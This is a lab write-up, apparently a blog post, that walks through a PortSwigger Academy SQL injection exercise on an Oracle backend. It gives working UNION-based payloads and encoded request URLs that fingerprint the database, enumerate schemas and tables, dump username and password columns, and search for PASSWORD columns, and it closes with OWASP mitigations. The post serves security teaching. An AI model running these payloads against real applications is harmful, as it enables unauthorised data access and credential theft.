# :game_die: Write-up: Oracle SQL injection (PortSwigger Academy).

---

# Write-up: Oracle SQL injection (PortSwigger Academy).

Summary

In this article I will briefly explain what SQL injection is and show you how attackers can exploit SQL injection on Oracle databases. We will approach the attack from a 100% black box perspective with no prior knowledge of the associated database technology.

*Source: [https://hackr.io/blog/sql-injection-cheat-sheet](https://hackr.io/blog/sql-injection-cheat-sheet)*Disclaimer

This article is for informational and educational purpose only, and for those who’re willing and curious to know and learn about Security and Penetration Testing. The content may not be used for illegal purposes. If you’re ready to learn something new for the good, then read on. When you interact with the Portswigger websites, make sure your actions comply with the Portswigger Website Terms of Use ([https://portswigger.net/web-security/certification/terms-and-conditions/website-terms-of-use](https://portswigger.net/web-security/certification/terms-and-conditions/website-terms-of-use)).

Details

SQL injection (SQLi) is a web application attack in which an attacker interferes with the queries an application makes to a database. These are typically areas of the application that require user input, such as login portals or search functionality.

SQL injection is an old vulnerability that has consistently dominated the OWASP top 10. According to OWASP’s current top 10, SQL injection ranks third ([https://owasp.org/Top10](https://owasp.org/Top10)/).

In this article we discuss the following topics:

- Getting access to PortSwigger Academy labs (steps 1–3)

- Discover application entry points (step 4

- Find possible SQL injection prefixes (step 5)

- Finding a corresponding suffix (step 6)

- Confirm SQL injection (steps 7 and 8)

- Enumerate database technology (step 9 and 10)

- Determine number of columns and data types (step 11 and 12)

- Determine database version (step 13)

- Dump the user table from the Oracle database (step 14–18)

- Using a wildcard to search for interesting column names (step 19 and 20)

Getting access to the Portswigger Academy lab environments

This PoC consists of 2 machines:

· an attacker machine (Kali Linux, Chrome Version 117.0.5938.132)

· vulnerable web server Portswigger (https://[16-bytes].web-security-academy.net/)

First we have to do some preparations:

· create account at Portswigger ([https://portswigger.net/users/register](https://portswigger.net/users/register))

1. Register an email address with Portswigger

Navigate to [https://portswigger.net/users/register](https://portswigger.net/users/register) . Enter your email address and click [Register]

*[https://portswigger.net/users/register](https://portswigger.net/users/register)*

2. Complete the registration with PortSwigger

Follow the instructions in the “Complete your registration” message.

*[https://www.minuteinbox.com/](https://www.minuteinbox.com/)*

After step 2 you should have PortSwigger Academy credentials to access the lab environment.

3. Access the PortSwigger Academy lab description “SQL injection attack, listing the database contents on Oracle”.

Navigate to [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle). Click [Access The Lab].

*[https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)*

A new browser tab opens that redirects you to the lab environment server: https://[16-bytes].web-security-academy.net/.

In our case, were redirected to web server [https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net)

## PoC: listing the database contents on Oracle

In general, the first step in discovering SQL injection vulnerabilities is looking for all possible application entry points. You have to focus on entry points that may interact with the backend database. Using Burp Suite or OWASP ZAP can be very helpful in this regard. Both tools provide insight into various parameters used by the target application. Parameters can exist in the body of POST/PUT requests or inside the URL of GET requests.

4. Discover application entry points

Browse to the target web application. Perform some application functions.

*HTTP GET parameter category*

Notice that this web application contains various categories such as “Accessories”, “Corporate Gifts”, etc. When you click on one of these categories, your input appears in the URL. This is why we know we are dealing with an HTTP GET request. The URL includes our application entry point, parameter ‘category’.

Finding working a prefix

The prefix is a character or sequence of characters to be added before the (malicious) sql injection payload. The function of the prefix is ​​to close existing SQL query statement. For example, if you search for the word “shoes,” you may end your existing search query statement with a single quote (shoes’). It can also be another character or sequence of characters. This is what you have to figure out. You may have a valid prefix, if it results in an error message.

5. Find possible SQL injection prefixes

Add ‘closing’ characters to the category parameter.

Payloads to try:

```
'
"
`
')
")
`)
'))
"))
`))
```

Payload = single quote (%27 url-encoded)

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=shoes%27](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=shoes%27)*

The single quote results in an error message. This means that you can use this prefix to find the corresponding suffix.

Besides the single quote, we found some other possible valid prefixes:

' OK. returns 500 server response (possible valid prefix)

') OK. returns 500 server response (possible be a valid prefix)

')) OK. returns 500 server response (possible a valid prefix)

Finding a corresponding suffix

After you have some possible prefix values, you can look for a corresponding suffix. The suffix is a character or sequence of characters to be added after the sql injection payload code. The function of the suffix is ​​to gracefully end the new (malicious) SQL query statement. Depending on the combination of prefix and suffix, the error message must disappear. If you find a prefix and suffix combination that doesn’t display an error message, you’re good to go.

The suffix always includes ‘comments’ code to eliminate trailing characters and simplify the attack. We need to use a comment that is universally used in the different SQL language dialects. The best comment to use in this regard: — bla (the double dash character must be followed by one whitespace).

*Source: [https://hackr.io/blog/sql-injection-cheat-sheet](https://hackr.io/blog/sql-injection-cheat-sheet)*

6. Find working prefix-suffix combinations.

Append ‘comment’ characters to the parameter ‘category’ after the prefix value.

Payloads to try:

```
' -- bla
') -- bla
')) -- bla
```

Payload = '— bla (single quote, double dash, white space 'bla')

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+--+bla)*

The payload ‘ — bla does not result in an error message. This means that you can use this prefix-suffix combination in our SQL injection attack.

We also tried some more possible valid prefix-suffix combinations.

' — bla OK; this is a valid prefix — suffix combination

') — bla NOK 500 code server response

')) — bla NOK 500 code server response

Confirm SQL injection

Now we have a valid prefix and suffix combination, we can determine if SQL injection is possible. You can do this, by adding SQL conditions such as ‘or 1=1’ and check how the web application behaves.

7. Add the always true condition (or 1=1) to the prefix — suffix

Payloads to try:

```

' or 1=1 -- bla
' or 1=0 -- bla
```

Payload: ' or 1=1 — bla

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20or%201=1%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+or+1%3D1+--+bla)*

The payload ‘or 1=1’ is valid. It results in a dump of all items.

8. Add the always false condition (or 1=0) to the prefix — suffix

Payload: ' or 1=0 — bla

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20or%201=0%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+or+1%3D0+--+bla)*

The payload ‘or 1=0’ is valid (no error message). It results in a dump of zero items.

We can see that the web application behaves differently depending on the payload. Thereby, we have confirmed that the web server is vulnerable for SQL injection.

Enumerate database technology

The next step in the SQL injection methodology is to enumerate the used database technology. This is important because there are slight differences in SQL syntax for each provider.

For this purpose, you can take advantage of various string concatenation methods.

*[https://hackr.io/blog/sql-injection-cheat-sheet](https://hackr.io/blog/sql-injection-cheat-sheet)*

9. Fuzz different string concatenation methods.

Payloads to try:

```
' or 'foobar' ='foo'||'bar' -- Oracle or PostgreSQL
' or 'foobar' ='foo'+'bar' -- MS SQL
' or 'foobar' ='foo' 'bar' -- MySQL
```

Add the Oracle / PostgreSQL string concatenation to a always true condition within the prefix-suffix combination.

Payload Oracle and PostgreSQL: 'or 'foobar' ='foo'||'bar' — bla

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20or%20%27foobar%27%20=%27foo%27||%27bar%27%20--%20Oracle%20or%20PostgreSQL](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+or+%27foobar%27+%3D%27foo%27%7C%7C%27bar%27+--+Oracle+or+PostgreSQL)*

Both payloads for MS SQL and MySQL resulted in a HTTP 500 code response.

Only the payload for Oracle and PostgreSQL results in a valid query. We reduced the possible technologies to Oracle and PostgreSQL.

To narrow down both technologies, we can use the different syntax for the substring function. Oracle only uses the function subst(), but PostgreSQL uses both functions subst() and substring(). If the substring() function works were dealing with PostgreSQL, if not it’s Oracle.

*[https://hackr.io/blog/sql-injection-cheat-sheet](https://hackr.io/blog/sql-injection-cheat-sheet)*

10. Fuzz different substring methods.

Payloads to try:

```
' or 'foobar' = substring('foo' ||'bar',1,20) -- only PostgreSQL
' or 'foobar' = substr('foo' ||'bar',1,20) -- Oracle and PostgreSQL

```

Payload only PostgreSQL: 'or 'foobar' = substring('foo' ||'bar',1,20) — only PostgreSQL

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20or%20%27foobar%27%20=%20substring(%27foo%27%20||%27bar%27,1,20)%20--%20only%20PostgreSQL](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+or+%27foobar%27+%3D+substring%28%27foo%27+%7C%7C%27bar%27%2C1%2C20%29+--+only+PostgreSQL)*

This results in an error message. That means that the back end database server is not PostgreSQL.

## Get Nol White Hat’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Let’s try the other payload to be sure that one is works and we can confirm it's Oracle technology.

Payload Oracle: 'or 'foobar' = substr('foo' ||'bar',1,20) — Oracle or PostgreSQL

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20or%20%27foobar%27%20=%20substr(%27foo%27%20||%27bar%27,1,20)%20--%20Oracle%20and%20PostgreSQL](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+or+%27foobar%27+%3D+substr%28%27foo%27+%7C%7C%27bar%27%2C1%2C20%29+--+Oracle+and+PostgreSQL)*

We can confirm that we are dealing with Oracle technology. We can continue to the next step: determine the number of columns.

Determine number of columns and data types

In this PoC we will use the ‘union-based’ SQL injection technique. In ‘union-based’ SQL injection, attackers use the UNION operator to combine the original SQL statement a with malicious statement. The malicious statement must be compatible with the original statement. It must use the same number of columns and same data types as the original statement. The first step is to determine the number of columns of the original statement.

How to determine the number of columns?

Well, you can use 2 techniques:

- The ‘order by’ technique

- The ‘union select’ technique

In the PoC, we will use the ‘union select’ technique. You can read more about the ‘order by’ technique on the Portswigger page ([https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)).

In the “union select” technique, the attacker adds a “null” column to the UNION SELECT query. If the number of columns does not match, an error message is displayed. The attacker continues to increase the ‘null’ columns until the error message disappears.

For non-Oracle databases the attacker could use the following statements:

' UNION SELECT null — bla

' UNION SELECT null,null — bla

' UNION SELECT null ,null,null — bla

We have confirmed that we are dealing with an Oracle backend database. This means that we must use “Oracle style” to determine the number of columns. We can successively add the following payloads to the ‘category=’ parameter:

' union select null from DUAL — bla

' union select null,null from DUAL — bla

' union select null,null,null from DUAL — bla

11. Determine the number of columns with the UNION SELECT technique.

Payloads to try:

```
' union select null from DUAL -- bla
' union select null,null from DUAL -- bla
' union select null,null,null from DUAL -- bla
```

Payload with correct number of columns: 'union select null,null from DUAL — bla

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20null,null%20from%20DUAL%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+null%2Cnull+from+DUAL+--+bla)*

No error message is displayed only in the case of “null,null”. This means that the original query contains two columns.

Our next step is to confirm the data type of both columns. This can be easily determined by inserting strings or integers at the columns positions.

12. Determine the data type of the columns.

Payloads to try:

```
' union select 'abc',null from DUAL -- bla
' union select 1,null from DUAL -- bla
' union select null,'def' from DUAL -- bla
' union select null,2 from DUAL -- bla
```

Payload that displays correct data types:

```
' union select 'abc', 'xyz' from DUAL -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20%27abc%27,%20%27xyz%27%20from%20DUAL%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+%27abc%27%2C+%27xyz%27+from+DUAL+--+bla)*

So far, we can conclude the following about the our union-based SQL injection attack:

- we need to use 2 columns

- both columns hold the charvar (string) data type

Determine database version

At this moment, we have enumerated all the requirements to use the union-method to retrieve data from the database.

Right now, we are able to retrieve the exact version of the database server. As mentioned earlier, each database provider has its own syntax. Based on two columns with both data type string, we can list the vendor specific statements for getting the database server version:

' UNION SELECT null,SUBSTRING(@@version,1,200) LIMIT 0,1 — MySQL version

' UNION SELECT null,SUBSTRING(@@version,1,200) WHERE row = 1 — MS SQL version

' union select null,substr(banner,1,200) from v$version%20 where rownum=1 — Oracle version

' UNION SELECT null,SUBSTRING(version(),1,200) LIMIT 1 — PostgreSQL version

Note: if you copy — past the above payloads, check if the double dash (comment) is correct.

13. Retrieve the Oracle database server version

Payload version Oracle:

```
' union select null,substr(banner,1,200) from v$version%20 where rownum=1 -- Oracle
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20null,substr(banner,1,200)%20from%20v$version%20%20where%20rownum=1%20--%20Oracle](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+null%2Csubstr%28banner%2C1%2C200%29+from+v%24version++where+rownum%3D1+--+Oracle)*

We already knew the back end database used Oracle technology. Now we have the exact database server version.

Retrieve the Oracle database version is just one item you can try. The PayloadAllTheThings site provides a huge list of possible items that can be retrieved from an Oracle database ([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-injection)).

Dump the user table from the Oracle database

From here, we will actually output the database information. It is important to mention that Oracle does not use the term ‘database’, but the speak about ‘schema users’. You can use the PentestMonkey site as reference ([https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)).

14. Show the current schema user.

Payload:

```
' union select null,user from DUAL -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20null,user%20from%20DUAL%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+null%2Cuser+from+DUAL+--+bla)*

15. List all schema users.

Payload:

```
'UNION SELECT DISTINCT null,owner FROM all_tables-- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION%20SELECT%20DISTINCT%20null,owner%20FROM%20all_tables--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION+SELECT+DISTINCT+null%2Cowner+FROM+all_tables--+bla)*

16. List alle tables owned by the current schema user.

Payload:

```
'UNION SELECT null,table_name FROM all_tables WHERE owner = user -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION%20SELECT%20null,table_name%20FROM%20all_tables%20WHERE%20owner%20=%20user%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION+SELECT+null%2Ctable_name+FROM+all_tables+WHERE+owner+%3D+user+--+bla)*

17. List all column names of table USERS_CPSHJF.

Payload:

```
' union select column_name,null from all_tab_columns WHERE table_name='USERS_CPSHJF' -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20column_name,null%20from%20all_tab_columns%20WHERE%20table_name=%27USERS_CPSHJF%27%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+column_name%2Cnull+from+all_tab_columns+WHERE+table_name%3D%27USERS_CPSHJF%27+--+bla)*

18. Dump all rows in columns USERNAME_MBADUX and PASSWORD_NSBRBQ from table USERS_CPSHJF

Payload:

```
' union select USERNAME_MBADUX,PASSWORD_NSBRBQ from USERS_CPSHJF -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20select%20USERNAME_MBADUX,PASSWORD_NSBRBQ%20from%20USERS_CPSHJF%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+select+USERNAME_MBADUX%2CPASSWORD_NSBRBQ+from+USERS_CPSHJF+--+bla)*

We successfully dumped the USERS_CPSHJF table!

Using a wildcard to search for interesting column names.

Our attack was focused on schema user 'PETER' . Sometimes you may have to data access of other schema users. You can use wildcards to search for data from other schema users.

19. Get all tables and table owners which include columns with string %PASSWORD% (wildcard).

Payload:

```
' union SELECT owner,table_name FROM all_tab_columns WHERE column_name LIKE '%PASSWORD%'-- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27%20union%20SELECT%20owner,table_name%20FROM%20all_tab_columns%20WHERE%20column_name%20LIKE%20%27%PASSWORD%%27--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27+union+SELECT+owner%2Ctable_name+FROM+all_tab_columns+WHERE+column_name+LIKE+%27%25PASSWORD%25%27--+bla)*

20. Get columns from table USER_DB_LINKS’ and owned by SYS

Payload:

```
'UNION SELECT null,column_name FROM all_tab_columns WHERE table_name = 'USER_DB_LINKS' and owner = 'SYS' -- bla
```

*[https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION%20SELECT%20null,column_name%20FROM%20all_tab_columns%20WHERE%20table_name%20=%20%27USER_DB_LINKS%27%20and%20owner%20=%20%27SYS%27%20--%20bla](https://0ad5009c04872f1181bbe49a00c60027.web-security-academy.net/filter?category=%27UNION+SELECT+null%2Ccolumn_name+FROM+all_tab_columns+WHERE+table_name+%3D+%27USER_DB_LINKS%27+and+owner+%3D+%27SYS%27+--+bla)*

We are able to list the columns, but we do not have access to SYS data. However, this provides insight into how a potential attacker could exploit the vulnerability. If you’re in a pentest engagement, always check the scope of the data you can have access to.

Mitigations

SQL injection vulnerabilities are a serious problem. This is still one of the most common attacks that causes a lot of damage. There are several ways to prevent SQL injection. OWASP provides the following recommendations:

Primary Defenses:

Option 1: Use of Prepared Statements (with Parameterized Queries)

Option 2: Use of Properly Constructed Stored Procedures

Option 3: Allow-list Input Validation

Option 4: Escaping All User Supplied Input

Additional Defenses:

Also: Enforcing Least Privilege

Also: Performing Allow-list Input Validation as a Secondary Defense

You can read more about defenses against SQL injection on the OWASP site ([https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)).

References

[https://hackr.io/blog/sql-injection-cheat-sheet](https://hackr.io/blog/sql-injection-cheat-sheet)

[https://portswigger.net/web-security](https://portswigger.net/web-security)

[https://owasp.org/Top10/](https://owasp.org/Top10/)

[https://www.sqlinjection.net/](https://www.sqlinjection.net/)

[https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)

---
